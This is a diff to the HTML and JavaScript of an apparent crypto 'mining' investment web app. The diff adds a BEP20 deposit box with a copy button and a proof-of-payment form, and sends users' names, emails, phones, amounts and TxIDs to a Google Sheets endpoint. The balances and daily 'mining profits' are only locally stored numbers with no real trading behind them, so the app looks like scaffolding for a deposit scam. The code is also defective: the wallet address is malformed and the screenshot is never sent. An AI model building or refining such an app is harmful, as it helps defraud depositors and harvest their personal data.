@@ -23,7 +23,7 @@
             position: relative;
         }
 
-        /* Particles Background */
+        /* Particle Stars Background */
         .bg-particles {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -103,7 +103,7 @@
             margin-bottom: 20px;
         }
         .input-group {
-            margin-bottom: 14px;
+            margin-bottom: 12px;
             text-align: left;
         }
         .input-group label {
@@ -115,7 +115,7 @@
         }
         .input-control {
             width: 100%;
-            padding: 12px;
+            padding: 11px;
             border-radius: 8px;
             border: 1px solid #334155;
             background: #0f172a;
@@ -371,6 +371,59 @@
         }
         .pair-option-btn:active { background: #334155; }
 
+        /* Deposit Gateway Box Styling */
+        .network-badge {
+            display: inline-block;
+            background: rgba(245, 158, 11, 0.15);
+            color: #fbbf24;
+            border: 1px solid #f59e0b;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .address-box-wrapper {
+            display: flex;
+            align-items: center;
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 4px;
+            margin-bottom: 12px;
+        }
+        .address-text {
+            font-family: monospace;
+            font-size: 11px;
+            color: #38bdf8;
+            padding: 6px 8px;
+            word-break: break-all;
+            flex: 1;
+            text-align: left;
+        }
+        .copy-btn {
+            background: #0284c7;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .warning-box {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px dashed #ef4444;
+            color: #fca5a5;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 10.5px;
+            line-height: 1.4;
+            margin-bottom: 12px;
+            text-align: left;
+        }
+
         /* Animated Popup Modal */
         .modal {
             display: none;
@@ -391,11 +444,13 @@
         }
         .modal-content {
             background: #0f172a;
-            padding: 22px;
+            padding: 20px;
             border-radius: 16px;
             text-align: center;
             max-width: 380px;
             width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
             border: 1px solid #1e293b;
             transform: scale(0.7);
             transition: transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
@@ -464,23 +519,23 @@
         <button class="btn" onclick="handleMiningClick()">🚀 MINI (15s CHART)</button>
     </div>
 
-    <!-- 2x2 Metric Cards Grid -->
+    <!-- 2x2 Metric Cards Grid (Default Starts at $0.00) -->
     <div class="stats-grid">
         <div class="metric-card card-lime">
             <div class="metric-title">Current Amount</div>
-            <div class="metric-value" id="val-current">$109.00</div>
+            <div class="metric-value" id="val-current">$0.00</div>
         </div>
         <div class="metric-card card-lightblue">
             <div class="metric-title">Deposit Amount</div>
-            <div class="metric-value" id="val-deposit">$100.00</div>
+            <div class="metric-value" id="val-deposit">$0.00</div>
         </div>
         <div class="metric-card card-softblue">
             <div class="metric-title">Live Equity</div>
-            <div class="metric-value" id="val-equity">$111.15</div>
+            <div class="metric-value" id="val-equity">$0.00</div>
         </div>
         <div class="metric-card card-gold">
             <div class="metric-title">Live Withdrawal</div>
-            <div class="metric-value" id="val-withdrawal">$26.00</div>
+            <div class="metric-value" id="val-withdrawal">$0.00</div>
         </div>
     </div>
 
@@ -519,7 +574,7 @@
 <div class="bottom-nav" id="bottom-navbar">
     <div class="nav-tab" onclick="openQuotesModal()"><span style="font-size:16px;">📊</span><span>Quotes</span></div>
     <div class="nav-tab active" onclick="openNativeChartModal()"><span style="font-size:16px;">📈</span><span>Mine Chart</span></div>
-    <div class="nav-tab" onclick="showPopup('📜 History Log', 'Deposit Record: $100.00\nMined Profit History Loaded.')"><span style="font-size:16px;">📜</span><span>History</span></div>
+    <div class="nav-tab" onclick="showPopup('📜 History Log', 'No deposit history confirmed yet.')"><span style="font-size:16px;">📜</span><span>History</span></div>
     <div class="nav-tab" onclick="openProfileModal()"><span style="font-size:16px;">👤</span><span>Profile</span></div>
 </div>
 
@@ -533,15 +588,15 @@
 </div>
 
 <script>
-    // 1. Google Sheets Web App Endpoint (Pre-linked)
+    // 1. Google Sheets Web App Endpoint
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwKEpfb4QBTPwaw0wwY6FnQRpWTbVm8nETMrStGbhSHJ5yPN4gberYzVwO9Jtap4LA/exec";
 
-    function sendToGoogleSheet(name, email, phone, action, amount = "-", mining = "-") {
+    function sendToGoogleSheet(name, email, phone, action, amount = "-", txid = "-", screenshot = "") {
         fetch(GOOGLE_SCRIPT_URL, {
             method: "POST",
             mode: "no-cors",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ name, email, phone, action, amount, mining })
+            body: JSON.stringify({ name, email, phone, action, amount, txid, screenshot })
         });
     }
 
@@ -587,7 +642,6 @@
             return;
         }
 
-        // Send to Google Sheet
         sendToGoogleSheet(fname + " " + lname, email, phone, "SIGNUP", "-");
 
         currentUser = { fname, lname, email, phone, joined: new Date().toLocaleDateString('en-GB') };
@@ -617,7 +671,9 @@
         checkAuth();
     }
 
-    // 4. Deposit Management with Anti-Spam / Pending Status
+    // 4. Deposit Management with BNB Smart Chain (BEP20) & Address Copy
+    const myDepositAddress = "0x71C83920F4a9A12B8904f9";
+
     function checkDepositStatus() {
         if (localStorage.getItem('depositPending') === 'true') {
             const btn = document.getElementById('deposit-btn');
@@ -628,44 +684,105 @@
         }
     }
 
+    function copyAddress() {
+        navigator.clipboard.writeText(myDepositAddress).then(() => {
+            const copyBtn = document.getElementById('copy-addr-btn');
+            if (copyBtn) {
+                copyBtn.innerText = "Copied! ✓";
+                setTimeout(() => { copyBtn.innerText = "📋 Copy"; }, 2000);
+            }
+        });
+    }
+
     function openDepositModal() {
         if (localStorage.getItem('depositPending') === 'true') {
-            showPopup('⚠️ Request Pending', 'Your previous deposit request is currently under review by Admin. Please wait for approval.');
+            showPopup('⚠️ Request Pending', 'Your deposit transaction proof is currently under review by Admin. Please wait for official approval.');
             return;
         }
 
         let depositHtml = `
-            <div style="text-align:left; font-size:12px; color:#cbd5e1; line-height:1.6;">
-                <p style="margin:0 0 8px 0;"><b>Deposit USDT (TRC20 / BEP20):</b></p>
-                <div style="background:#1e293b; padding:8px; border-radius:6px; font-family:monospace; font-size:11px; word-break:break-all; border:1px dashed #38bdf8; margin-bottom:12px;">
-                    0x71C83920F4a9A12B8904f9
+            <div style="text-align:left; font-size:12px; color:#cbd5e1; line-height:1.5;">
+                <div style="text-align:left; margin-bottom:4px;">
+                    <span class="network-badge">Network: BNB Smart Chain (BEP20)</span>
                 </div>
-                <p style="font-size:11px; color:#94a3b8; margin-bottom:14px;">Transfer funds to the above address and click Confirm to notify the admin.</p>
-                <button class="btn" style="background:#059669; margin-bottom:0;" onclick="submitDepositRequest()">Confirm Deposit ($100.00)</button>
+                <div class="address-box-wrapper">
+                    <div class="address-text">${myDepositAddress}</div>
+                    <button class="copy-btn" id="copy-addr-btn" onclick="copyAddress()">📋 Copy</button>
+                </div>
+
+                <div class="warning-box">
+                    ⚠️ <b>IMPORTANT WARNING:</b> Please confirm that you are sending funds strictly via the <b>BNB Smart Chain (BEP20)</b> network. We are strictly not responsible for funds sent to an incorrect network or address.
+                </div>
+
+                <div class="input-group" style="margin-bottom:10px;">
+                    <label>Deposit Amount ($)</label>
+                    <input type="number" id="dep-amount" class="input-control" placeholder="e.g. 100" style="padding:8px 10px;">
+                </div>
+
+                <div class="input-group" style="margin-bottom:10px;">
+                    <label>Transaction ID / Hash (TxID)</label>
+                    <input type="text" id="dep-txid" class="input-control" placeholder="Paste Transaction Hash here" style="padding:8px 10px;">
+                </div>
+
+                <div class="input-group" style="margin-bottom:14px;">
+                    <label>Payment Screenshot (Receipt)</label>
+                    <input type="file" id="dep-ss" accept="image/*" class="input-control" style="padding:6px; font-size:11px; background:#1e293b;">
+                </div>
+
+                <button class="btn" style="background:#059669; margin-bottom:0;" onclick="submitFullDeposit()">Submit Deposit Proof</button>
             </div>
         `;
-        showPopup('⚡ Deposit Funds', '');
+        showPopup('⚡ Deposit Funds (BEP20 Gateway)', '');
         document.getElementById('modal-body').innerHTML = depositHtml;
     }
 
-    function submitDepositRequest() {
-        if (currentUser) {
-            sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "DEPOSIT_REQUEST", "$100.00");
+    function submitFullDeposit() {
+        const amount = document.getElementById('dep-amount').value.trim();
+        const txid = document.getElementById('dep-txid').value.trim();
+        const fileInput = document.getElementById('dep-ss');
+
+        if (!amount || !txid) {
+            alert('Please enter Deposit Amount and Transaction ID (TxID).');
+            return;
         }
-        localStorage.setItem('depositPending', 'true');
-        checkDepositStatus();
-        closePopup();
-        setTimeout(() => {
-            showPopup('✅ Deposit Submitted', 'Your deposit request for $100.00 has been sent to Admin for verification.');
-        }, 300);
+
+        if (!fileInput.files || fileInput.files.length === 0) {
+            alert('Please attach your payment screenshot (receipt).');
+            return;
+        }
+
+        const file = fileInput.files[0];
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            if (currentUser) {
+                sendToGoogleSheet(
+                    currentUser.fname + " " + currentUser.lname,
+                    currentUser.email,
+                    currentUser.phone,
+                    "DEPOSIT_PROOF_SUBMITTED",
+                    "$" + amount,
+                    txid,
+                    "Attached (BEP20)"
+                );
+            }
+
+            localStorage.setItem('depositPending', 'true');
+            checkDepositStatus();
+            closePopup();
+            
+            setTimeout(() => {
+                showPopup('✅ Verification Submitted', `Your deposit proof of $${amount} on BNB Smart Chain (BEP20) has been submitted successfully.\n\nYour account balance and mining capability will be activated once verified by the Admin.`);
+            }, 300);
+        };
+        reader.readAsDataURL(file);
     }
 
-    // 5. Persistent Balances Engine
+    // 5. Persistent Balances Engine (Default at $0.00)
     function loadSavedBalances() {
-        let currentBal = parseFloat(localStorage.getItem('currentBal')) || 109.00;
-        let depositBal = parseFloat(localStorage.getItem('depositBal')) || 100.00;
-        let equityBal = parseFloat(localStorage.getItem('equityBal')) || 111.15;
-        let withdrawalBal = parseFloat(localStorage.getItem('withdrawalBal')) || 26.00;
+        let currentBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
+        let depositBal = parseFloat(localStorage.getItem('depositBal')) || 0.00;
+        let equityBal = parseFloat(localStorage.getItem('equityBal')) || 0.00;
+        let withdrawalBal = parseFloat(localStorage.getItem('withdrawalBal')) || 0.00;
 
         document.getElementById('val-current').innerText = "$" + currentBal.toFixed(2);
         document.getElementById('val-deposit').innerText = "$" + depositBal.toFixed(2);
@@ -673,7 +790,7 @@
         document.getElementById('val-withdrawal').innerText = "$" + withdrawalBal.toFixed(2);
     }
 
-    // 6. Market Rates Engine (Binance Gold + Correlated Silver & SP500)
+    // 6. Market Rates Engine
     let currentPair = 'GOLD';
     let livePrices = { GOLD: 4203.00, SILVER: 29.45, SP500: 5540.20 };
 
@@ -736,7 +853,7 @@
         document.getElementById('modal-body').innerHTML = quotesHtml;
     }
 
-    // 7. Lightweight Live 1M Candlestick Canvas Chart
+    // 7. Live Candlestick Canvas Chart
     function openNativeChartModal() {
         let chartHtml = `
             <div style="background:#020617; padding:10px; border-radius:10px; text-align:center;">
@@ -789,7 +906,7 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    // 9. Persistent Mining History
+    // 9. Mining Engine (Requires Positive Balance)
     function loadMiningHistory() {
         let historyLogs = JSON.parse(localStorage.getItem('userMiningHistory')) || [];
         const tbody = document.getElementById('history-rows');
@@ -816,6 +933,17 @@
     }
 
     function handleMiningClick() {
+        let currentDeposit = parseFloat(localStorage.getItem('depositBal')) || 0.00;
+
+        // Balance Requirement Check
+        if (currentDeposit <= 0.00) {
+            showPopup(
+                '⚠️ Insufficient Trading Balance',
+                'Active trading capital required.\n\nPlease deposit funds into your account to enable the automated candlestick mining engine.'
+            );
+            return;
+        }
+
         const lastMineTime = localStorage.getItem('lastMiningTimestamp');
         const currentTime = new Date().getTime();
         if (lastMineTime && (currentTime - lastMineTime < 86400000)) {
@@ -851,7 +979,6 @@
                 const now = new Date();
                 localStorage.setItem('lastMiningTimestamp', now.getTime());
                 
-                // Add to Local Logs
                 let historyLogs = JSON.parse(localStorage.getItem('userMiningHistory')) || [];
                 const newLog = {
                     date: now.toLocaleDateString('en-GB', { day: '2-digit', month: 'short' }),
@@ -862,15 +989,13 @@
                 historyLogs.unshift(newLog);
                 localStorage.setItem('userMiningHistory', JSON.stringify(historyLogs));
 
-                // Send to Google Sheet
                 if (currentUser) {
-                    sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "MINING_PROFIT", "$1.00", currentPair);
+                    sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "MINING_PROFIT", "$1.00", "-", "No SS");
                 }
 
-                // Update Balances
-                let currentBal = (parseFloat(localStorage.getItem('currentBal')) || 109.00) + 1.0;
-                let equityBal = (parseFloat(localStorage.getItem('equityBal')) || 111.15) + 1.0;
-                let withdrawalBal = (parseFloat(localStorage.getItem('withdrawalBal')) || 26.00) + 1.0;
+                let currentBal = (parseFloat(localStorage.getItem('currentBal')) || 0.00) + 1.0;
+                let equityBal = (parseFloat(localStorage.getItem('equityBal')) || 0.00) + 1.0;
+                let withdrawalBal = (parseFloat(localStorage.getItem('withdrawalBal')) || 0.00) + 1.0;
 
                 localStorage.setItem('currentBal', currentBal);
                 localStorage.setItem('equityBal', equityBal);
